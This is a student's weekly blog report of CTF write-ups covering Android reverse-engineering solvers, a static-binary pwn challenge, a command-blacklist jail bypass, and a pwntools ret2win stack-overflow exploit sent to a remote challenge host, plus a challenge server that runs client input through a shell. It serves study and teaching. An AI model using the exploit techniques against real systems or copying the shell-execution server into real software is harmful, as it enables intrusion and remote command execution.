---
title: "第十周周报"
published: 2026-11-22
description: "本周学习，逆向/Pwn"
tags: ["周报"]
category: "本周幕报"
slug: "1-week-10"
---
1
第⼗周周报
ISCTF
Re
蓝鲨checkcheck
解压缩
脱壳
分析
脚本
蓝鲨check
获取信息
反汇编
解密
脚本
⼩蓝鲨的通⾏证
信息获取
分析
解密及脚本
Pwn
Registry Audit
获取信息
反汇编
分析漏洞
解题
NSSCTF
Pwn
SWPUCTF Pwn新⽣赛签到题
gift_pwn
信息获取
⽤IDA反汇编

2
脚本与flag
只需要nc⼀下~
第⼀种
第⼆种
史铁⽣说过，如果你抑郁了，说明你活在过去，如果你焦虑了，说明你活在未来，如果你平静了，才说
明你是活在当下 。不要沉溺过去，也不要忧虑未来，⼀定要好好活在当下，让⾃⼰快乐！
这是⼀道安卓逆向，程序是⼀个apk⽂件，对于apk⽂件，第⼀步肯定是解包，可以⽤jadx拿到java⽂
件，或者解压缩，可以⽤unzip/7-zip，也可以改⽂件后缀改为zip然后解压
ISCTF
Re
蓝鲨checkcheck
解压缩

3
得到⽂件夹
先⽤jadx查看
重点看我标蓝的地⽅
说明真正的库是libblueshark_check.so

4
进⼊lib/x86_64，有⼏个.so⽂件，选择libblueshark_check.so放⼊DIE查看
有upx壳
脱壳

5
IDA打开查看

6
先查看`anonymous namespace'::kTarget[n26]
26个数组
A6 C1 D0 E3 02 39 FF 16 7E DB 7D 06 32 E1 EA BA
D4 CA 70 62 F3 07 5E C8 70 ED
已知前⼏个为
已知前五个“ISCTF{”所以通过已知明⽂反推出key
然后通过密钥枚举出flag
分析
脚本

7
拿到题优先分析⽂件类型
是⼀个apk⽂件，依旧把apk当作⼀个压缩包解压
蓝鲨check
获取信息
tgt = bytes.fromhex(
"a6c1d0e30239ff167edb7d0632e1eabad4ca7062f3075ec870ed"
)
def ror8(x, n):
n &= 7
return ((x >> n) | (x << (8 - n))) & 0xFF
def solve(rk, s):
return bytes(
ror8(tgt[i], (i % 5) + 1)
^ ((rk + 0x11 * i) & 0xFF)
^ s[i & 3]
for i in range(26)
)
for rk, s in [
(0x37, bytes([0x2D, 0x6B, 0x00, 0x00])),
(0xB7, bytes([0xAD, 0xEB, 0x80, 0x80])),
]:
print(hex(rk), solve(rk, s).decode())
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
Python

8
⽤jadx打开classes.dex
flag头
⽤IDA打开lib⽂件夹中的.so⽂件
反汇编

9
打开查看字符串
有明显的Base64编码，定位进⼊
⾸先解第⼀个Base64编码
QzBOR3JAZHVJYXQxb240X3VfRjFuZF8= ——> C0NGr@duIat1on4_u_F1nd_
第⼆个解的时候没有解出来，⼀串乱码（不可⻅字符）
解密
v44 = -19;

10
这是典型的XXTEA的delta
所以这⾥应该是先解base64，
这是密⽂需要进⾏解密
XXTEA的密钥是第⼀个bs1的前16个字符
这题是XXTEA和CBC
LODWORD(v19) = -1640531527;
do
脚本
83 aa f0 47 5d d5 95 b2 3c e3 fc b3 84 0a ff d1
54 12 95 ca 0c 4a ea 51 f6 b8 18 32 be 73 32 d6
1
2
bs2 Python

11
import base64
#------------下⾯的是标准XXTEA的解密，在我知识库⾥存的-------------
DELTA = 0x9E3779B9
MASK = 0xFFFFFFFF
def _mx(y, z, s, p, e, k):
return ((((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4)))
^ ((s ^ y) + (k[(p & 3) ^ e] ^ z))) & MASK
def _key_words(key: bytes):
k = key.ljust(16, b"\x00")[:16]
return [int.from_bytes(k[i:i + 4], "little") for i in range(0, 16, 4)
]
def _to_words(data: bytes, pad=True):
if pad and len(data) % 4:
data = data + b"\x00" * (4 - len(data) % 4)
return [int.from_bytes(data[i:i + 4], "little") for i in range(0, len
(data), 4)]
def _from_words(words):
return b"".join(w.to_bytes(4, "little") for w in words)
def xxtea_encrypt(data: bytes, key: bytes) -> bytes:
v = _to_words(data)
k = _key_words(key)
n = len(v)
if n < 2:
return data
rounds = 6 + 52 // n
s = 0
z = v[n - 1]
for _ in range(rounds):
s = (s + DELTA) & MASK
e = (s >> 2) & 3
for p in range(n - 1):
y = v[p + 1]
v[p] = (v[p] + _mx(y, z, s, p, e, k)) & MASK
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
Python

12
z = v[p]
y = v[0]
v[n - 1] = (v[n - 1] + _mx(y, z, s, n - 1, e, k)) & MASK
z = v[n - 1]
return _from_words(v)
def xxtea_decrypt(data: bytes, key: bytes, orig_len=None) -> bytes:
v = _to_words(data, pad=False)
k = _key_words(key)
n = len(v)
if n < 2:
out = data
else:
rounds = 6 + 52 // n
s = (rounds * DELTA) & MASK
y = v[0]
for _ in range(rounds):
e = (s >> 2) & 3
for p in range(n - 1, 0, -1):
z = v[p - 1]
v[p] = (v[p] - _mx(y, z, s, p, e, k)) & MASK
y = v[p]
z = v[n - 1]
v[0] = (v[0] - _mx(y, z, s, 0, e, k)) & MASK
y = v[0]
s = (s - DELTA) & MASK
out = _from_words(v)
return out[:orig_len] if orig_len is not None else out.rstrip(b"\x00"
)
#-------------------------解题-------------------------
bs1 = "QzBOR3JAZHVJYXQxb240X3VfRjFuZF8="
bs2 = "g6rwR13VlbI84/yzhAr/0VQSlcoMSupR9rgYMr5zMtY="
def main():
seg1 = base64.b64decode(bs1)
print("上半部分:", seg1.decode())
ct = base64.b64decode(bs2)
key = seg1[:16]
iv = bs1.encode()[:16]
parts = []
for offset in range(0, len(ct), 16):
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90

13
cipher = ct[offset:offset + 16]
xor_target = iv if offset == 0 else ct[offset - 16:offset]
temp = xxtea_decrypt(cipher, key, 16)
plain_block = bytes(a ^ b for a, b in zip(temp, xor_target))
parts.append(plain_block)
seg2 = b"".join(parts)[:24]
print("下半部分:", seg2.decode())
flag = "ISCTF{" + seg1.decode() + seg2.decode() + "}"
print("Flag:", flag)
if __name__ == "__main__":
main()
91
92
93
94
95
96
97
98
99
100
101
102
103
104

14
⼩蓝鲨的通⾏证
信息获取

15
⼿机上下载运⾏
apk⽂件

16
改名字解压缩
进⼊lib⽂件夹，我习惯分析x86那个，ida打开
先查看 Java_com_echopass_core_NativeBridge_nativeVerify()这个是⼀个假的真正的进⼊
JNI_OnLoad
查看定位地址0x3C10
得知真正校验函数在sub_28E0
分析

17
进⼊
⾃⼰不会分析，让ai写解题脚本，然后我学
要找两组数据，在java层 ，⽤jadx打开
第⼆张图⽚上代码是把三段拼成16字节
解密及脚本

18
UiTheme.resolveAccent() -> -12951775
PaletteIndex.baseOffset() -> 186106078
CompatShim.packTag() -> "echo2.41"
seed = 215f3aff dec0170b 6563686f322e3431
然后再看
光标所在就是
291273235 = 0x115C7A13 -> 13 7A 5C 11
961244674 = 0x394B6E02 -> 02 6E 4B 39
salt = 137a5c11026e4b39
在IDA⾥sub_2450是⼀个⼩VM虚拟机，⽤两组数据⽣成0xB9F（2975）字节的字节码然后与.so⽂件⾥
的表进⾏异或（0x620）
每条指令固定7字节
总共425条指令
然后进⾏GF(2)线性变换
最后得到flag
因为⾥⾯有调⽤.so,所以脚本在有那个⽂件的⽬录跑
inner = j4v4_s33d_jn1_byt3c0d3_vm_1n51d3
flag = ISCTF{j4v4_s33d_jn1_byt3c0d3_vm_1n51d3}

19
import struct
SO = "libticket.so"
d = open(SO, "rb").read()
# ===== 1. seed / salt（来⾃ Java 层） =====
# SeedSource.collect()
seed = (struct.pack("<i", -12951775)
+ struct.pack("<I", 186106078)
+ b"echo2.41")
# EchoSalt.nativeSalt()
salt = struct.pack("<II", 291273235, 961244674)
# ===== 2. ⽣成 VM 字节码 =====
# 对应 sub_2450 ⾥的第⼀个循环
B = bytearray(0xB9F)
eax, ecx, dil = 1, 3, 0x6B
while True:
B[eax - 1] = (seed[(ecx - 3) & 0xE]
+ salt[(eax - 1) & 6]
+ dil + 0xEF) & 0xFF
if eax == 0xB9F:
break
B[eax] = (seed[ecx & 0xF]
+ salt[eax & 7]
+ dil) & 0xFF
eax += 2
ecx += 6
dil = (dil + 0x22) & 0xFF
# ===== 3. 解密字节码 =====
code = bytearray(0xB9F)
# 前 0xB80 字节和 0x620 表异或
for i in range(0xB80):
code[i] = B[i] ^ d[0x620 + i]
# 尾部 3 个 8 字节常量
patches = [
0x4AC59A51836F640E,
0x407B308504125CDA,
0x5AD5DE629063771E,
]
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
Python

20
for k, c in enumerate(patches):
for j in range(8):
code[0xB80 + k * 8 + j] = (
B[0xB80 + k * 8 + j] ^ ((c >> (8 * j)) & 0xFF)
)
# 最后 7 字节
tail = [0xE1, 0x6C, 0x24, 0x15, 0x96, 0x40, 0x8B]
for j, x in enumerate(tail):
code[0xB98 + j] = B[0xB98 + j] ^ x
code = bytes(code)
# ===== 4. 读取数据表 =====
perm = d[0x5D0:0x5F0] # 32 字节置换
const8 = d[0x5F0:0x5F8] # RAM[0x40..0x47]
target = d[0x600:0x620] # 32 字节⽬标
# ===== 5. VM 执⾏器 =====
def rol32(x, n):
n &= 31
return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF if n else x
def ror32(x, n):
n &= 31
return ((x >> n) | (x << (32 - n))) & 0xFFFFFFFF if n else x
def run(inp):
ram = bytearray(128)
# RAM[0..31] = 输⼊按 perm 打乱
for i in range(32):
ram[i] = inp[perm[i]]
# RAM[0x40..0x47] = const8
ram[0x40:0x48] = const8
# RAM[0x50..0x57] = salt
ram[0x50:0x58] = salt
regs = [0] * 8
pc = 0
while True:
op = code[pc]
a = code[pc + 1]
b = code[pc + 2]
imm = struct.unpack("<i", code[pc + 3:pc + 7])[0]
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93

21
pc += 7
if op == 1: # LOADI
regs[a & 7] = imm & 0xFFFFFFFF
elif op == 2: # LOAD
addr = b & 0x7F
regs[a & 7] = int.from_bytes(ram[addr:addr + 4], "little")
elif op == 3: # STORE
addr = a & 0x7F
ram[addr:addr + 4] = (regs[b & 7] & 0xFFFFFFFF).to_bytes(4,
"little")
elif op == 4: # MOV
regs[a & 7] = regs[b & 7]
elif op == 6: # XOR
regs[a & 7] ^= regs[b & 7]
elif op == 7: # ROL
regs[a & 7] = rol32(regs[a & 7], b)
elif op == 8: # ROR
regs[a & 7] = ror32(regs[a & 7], b)
elif op == 11: # HALT
break
elif op == 12: # ROLX
regs[a & 7] = rol32(regs[a & 7], b) ^ 0x5A5A5A5A
else:
raise ValueError(f"bad opcode {op} at {pc - 7:#x}")
return bytes(ram[:32])
# ===== 6. 建 GF(2) 线性⽅程组 =====
def vec(b):
"""32 字节 -> 256 位整数"""
return sum(1 << i for i in range(256) if (b[i // 8] >> (i % 8)) & 1)
C = vec(run(bytes(32))) # 输⼊全 0 的常数项
cols = []
for k in range(256):
inp = bytearray(32)
inp[k // 8] ^= 1 << (k % 8)
cols.append(vec(run(bytes(inp))) ^ C)
b = vec(target) ^ C
# 建 256 ⾏，每⾏ 256 个变量 + 1 个常数位
rows = []
for j in range(256):
row = 0
for k in range(256):
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140

22
if (cols[k] >> j) & 1:
row |= 1 << k
if (b >> j) & 1:
row |= 1 << 256
rows.append(row)
# ⾼斯消元
pivots = []
r = 0
for c in range(256):
sel = None
for i in range(r, 256):
if (rows[i] >> c) & 1:
sel = i
break
if sel is None:
continue
rows[r], rows[sel] = rows[sel], rows[r]
for i in range(256):
if i != r and ((rows[i] >> c) & 1):
rows[i] ^= rows[r]
pivots.append(c)
r += 1
if r == 256:
break
x = 0
for i, c in enumerate(pivots):
if (rows[i] >> 256) & 1:
x |= 1 << c
sol = bytearray(32)
for k in range(256):
if (x >> k) & 1:
sol[k // 8] |= 1 << (k % 8)
# ===== 7. 输出 =====
print("inner =", sol)
print("flag = ISCTF{" + sol.decode() + "}")
print("verify =", run(sol) == target)
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180

23
我先配了⼀个专⻔打Pwn的虚拟机
先判断⼀下⽂件类型
Pwn
Registry Audit
获取信息

24
是静态ELF64位
列出保护机制
打印字符串

25
太杂乱了，筛选⼀下

26
1 list 2 edit 3 view 4 audit 0 exit
__new_exitfn
corrupted double-linked list (not small)
malloc(): smallbin double linked list corrupted
malloc(): unsorted double linked list corrupted
malloc(): largebin double linked list corrupted (nextsize)
malloc(): largebin double linked list corrupted (bk)
get_free_list
Failed loading %lu audit modules, %lu are supported.
listp->slotinfo[cnt].gen <= GL(dl_tls_generation)
new_nlist < ns->_ns_global_scope_alloc
cannot allocate dependency list
map->l_searchlist.r_list == NULL
cannot allocate symbol search list
cxa_atexit.c
exit 0
corrupted double-linked list
listp != NULL
Argument list too long
cannot create scope list
map_index < nlist
__internal_atexit
remove_from_free_list
LD_AUDIT
memory_arena_reuse_free_list
cxa_atexit.o
__exit_lock
list_all_lock

27
freeres_list
free_list_lock
tunable_list
tunable_env_alias_list
transmem_list
_IO_list_lock
__nptl_stack_list_del
_sys_errlist_internal_len
_dl_initial_searchlist
__exit_funcs
__get_errlist
__internal_atexit
__environ_array_list
__new_exitfn
__exit_funcs_lock
_dl_audit_pltexit
_dl_add_to_namespace_list
__exit_funcs_done
_nl_make_l10nflist
_dl_tls_dtv_slotinfo_list
__run_exit_handlers
__cxa_atexit
_dl_scope_free_list
_IO_list_resetlock
__new_exitfn_called
__rtld_env_path_list
_IO_list_unlock
_nl_locale_file_list

28
查询并过滤符号表
IDA打开查看main函数
__nptl_stack_list_add
_sys_errlist_internal
_IO_list_all
反汇编

29
进⼊show_record/set_record/walk_records这三个函数查看因为有标记"1 list 2 edit 3 view 4 audit
0 exit"
show_record：3.view
set_record：2.edit
walk_records：1.list
ld1：set_record：2.edit
分析漏洞

30
只限制了if (n7 <= 7) 如果i<0则全部通过
&g_book + 64 * n7 + 64, 64) ——>写⼊地址 = g_book + (i + 1) * 0x40
ld2：show_record：3.view
__int64 set_record()
{
__int64 result; // rax
int v1; // ecx
int v2; // r8d
int v3; // r9d
char v4[44]; // [rsp+0h] [rbp-30h] BYREF
int n7; // [rsp+2Ch] [rbp-4h]
IO_puts((__int64)"index:");
result = take_line((__int64)v4, 32);
if ( (int)result >= 0 )
{
n7 = atoi(v4);
if ( n7 <= 7 )
{
_printf((unsigned int)"data for %d:\n", n7, (unsigned int)"data for
%d:\n", v1, v2, v3, v4[0]);
_read(0, (char *)&g_book + 64 * n7 + 64, 64);
return IO_puts((__int64)"stored");
}
else
{
return IO_puts((__int64)"out of range");
}
}
return result;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
Python

31
这⾥v7 = 64没有问题，但是如果我改⼀下，改成v7 = 128/256/512/1024就有问题了多出来的字节会顺
着栈往上依次覆盖 //栈溢出
（⽆canary）随机值
输⼊在虚拟机输⼊
cd ~/pwn/reg 跳转⽬录
gdb -q ./chal \ 动调
-ex 'b *0x4023e9' \ 在main函数⼊⼝点下断点
-ex 'run' \ 运⾏
-ex 'restore sealed.rec binary 0x4c0000' \ 调⽤sealed.rec，写进内存
-ex 'call (int)stamp_record(0x4c0000, 18)' \ 调⽤隐藏函数，进⾏解密，输出flag
-ex 'quit'
解题
__int64 __fastcall show_record(__int64 a1, __int64 n32, __int64 a3, int a4,
int a5, int a6)
{
char v7[64]; // [rsp+0h] [rbp-40h] BYREF
_printf((unsigned int)"record size: %u\n", n64, (unsigned int)"record siz
e: %u\n", a4, a5, a6, v7[0]);
_read(0, (int)v7, n64);
return IO_puts((__int64)v7);
}
1
2
3
4
5
6
7
8
Python

32
⾄于为什么是stamp_record（虽然这个没有任何⼀函数调⽤或交叉引⽤）
1.名字翻译过来：盖章记录
2.函数内⻓度正等于附件⾥的18字节
最终flag：ISCTF{ts1relson_w4s_r1ght_p4th_zzzz}
ISCTF的题剩下的我不会做，准备先从NSSCTF上做⼀些pwn⼊⻔
NSSCTF
Pwn
SWPUCTF Pwn新⽣赛签到题

33
启动虚拟机，进⼊对应⽬录
这个⽂件本身就是⼀个py⽂件（上⾯的是我给改名了）

34
⿊名单：'cat','ls',' ','cd','echo','<','${IFS}'
没有过滤bash启⽤新的shall
所以⽤bash

35
先查看全部⽂件，注意有⼀个flag⽂件
cat它
获得flag：NSSCTF{ffb00bac-27a8-4cb5-addc-2bf90ec4e20f}
⾸先链接容器
gift_pwn
信息获取

36
⽆论怎么输⼊，都没有反应，说明不是上⾯那种考验shell命令使⽤的题
是⼀个ELF64⽂件、checksec查看⽂件安全属性
第⼀⾏：64 位 Linux 程序，⼩端
第⼆⾏：GOT 表可写 → 可以改 GOT
第三⾏：没有栈保护 → 栈溢出可以直接覆盖返回地址
第四⾏：栈/堆不可执⾏ → 不能直接往栈上写 shellcode 执⾏
第五⾏：程序基址固定 0x400000 → 函数、GOT、PLT 地址都是固定的
第六⾏：没去符号 → 函数名在

37
栈溢出不会触发__stack_chk_fail，可覆盖返回地址
⽆PIE，即地址固定
栈不可执⾏
可以直接在IDA上查看到函数名
所以⽤DIE查看⼀下⽂件类型
发现调⽤vuln函数进⼊
⽤IDA反汇编

38
点进去发现溢出点为buf[16]，但是read可以输⼊0x64（_BYTE buf[16]; // [rsp+0h] [rbp-10h]
BYREF）
存在/bin/sh权限⽂件进⼊
rodata:00000000004006A6 command db '/bin/sh',0 ; DATA XREF: gift+E↑o
栈溢出⻓度offset = 0x10 + 8 = 0x18 = 24
gift = 0x4005C4 - 0xE = 0x4005B6
脚本与flag

39
# 导⼊ pwntools
from pwn import *
# 64 位 Linux
context(arch='amd64', os='linux')
# 调试时打开
# context.log_level = 'debug'
# ===== 1. 连接远程 =====
io = remote('node4.anna.nssnode.cn', 23934)
# 本地测试⽤这个
# io = process('./附件1')
# ===== 2. 后⻔函数地址 =====
# objdump 确认：0x4005b6 <gift>
gift = 0x4005B6
# ===== 3. 偏移 =====
# buf[16] 在 [rbp-0x10]
# 0x10 + 8 = 0x18 = 24
offset = 0x18
# ===== 4. 构造 payload =====
# 24 字节填充 + gift 地址
payload = b'A' * offset + p64(gift)
# ===== 5. 发送 =====
io.sendline(payload)
# ===== 6. 拿 shell =====
io.interactive()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
Python

40
ls之后出现flag
最终flag：NSSCTF{5e8da6bd-b9e2-4ddb-bdb1-06eb9a07a608}
这个⾮常简单
nc链接
尝试ls
只需要nc⼀下~

41
两个，cat第⼀个
这道题有两种解题⽅法
直接env
echo $FLAG
第⼀种
第⼆种

42
都是flag
NSSCTF{2cc49fdb-c781-4e0c-8c83-500d150c3442}
第⼆个我也cat了
cat app.py

43
import os
import subprocess
import socketserver
class TerminalHandler(socketserver.StreamRequestHandler):
def handle(self):
self.intro()
while True:
try:
data = self.rfile.readline().strip()
if not data:
break
result = self.execute_command(data)
self.send_result(result)
except Exception as e:
self.send_error(str(e))
def intro(self):
self.wfile.write(b"Welcome to the virtual terminal!\n")
def execute_command(self, command):
output = subprocess.check_output(command, shell=True)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
Python

44
return output
def send_result(self, result):
self.wfile.write(result)
def send_error(self, error):
self.wfile.write(b"Error: " + error.encode() + b"\n")
if __name__ == "__main__":
HOST, PORT = "0.0.0.0", 9999
server = socketserver.ThreadingTCPServer((HOST, PORT), TerminalHandler
)
server.serve_forever()
24
25
26
27
28
29
30
31
32
33
34